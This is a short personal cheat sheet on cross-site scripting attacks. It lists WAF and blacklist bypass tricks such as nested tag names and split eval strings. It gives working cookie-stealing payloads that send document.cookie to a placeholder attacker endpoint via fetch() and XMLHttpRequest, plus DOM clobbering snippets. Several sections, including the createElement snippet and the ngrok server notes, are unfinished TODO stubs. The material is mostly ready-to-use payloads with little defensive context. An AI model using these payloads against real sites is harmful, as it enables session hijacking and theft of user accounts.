# XSS 

### Understand what the script intends to do. 

## Blacklisting & Whitelisting
---

### 1) Page Source 
See if the page has anything, try to break it. 
### 2) Regex Filters 
https://regexr.com/ 

Use the explanations to find what you can and can't do to bypass. 
### 3) WAF ByPass 
 
Place the word inside of the word in different caps. [so close but so far ;;]
* iIMGmg
* scrSCRIPTpt
* onONERRORerror
* 'eval("al" + "ert(1)")'
* `<scr<script>ipt>`
## Making Requests 
--

### .fetch()
```js 
<script/>fetch('{REQUEST_ENDPOINT}?x=' + document.cookie);</script>
```
### XMLHTTPRequest
```js
<svg>
<script>
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "<endpoint>" + document.cookie, false );
xmlHttp.send( null );
</script>
</svg>
```
### document.createElement 
```
var c = document.createElement();
c.innerHTML = "script" 
TODO
```

### onerror, onblur 
```
<img src=x onerror=fetch()></img>
```

### Hosting your own server to upload 

## DOM Clobbering two forms 
In title 
```js
<iframe id="tk"></iframe><script>
```
In Body 
```js
<form id="rp">
  <input name="ownerDocument">
  <script>alert('pwn!')</script>
```


Using ngrok. TODO 
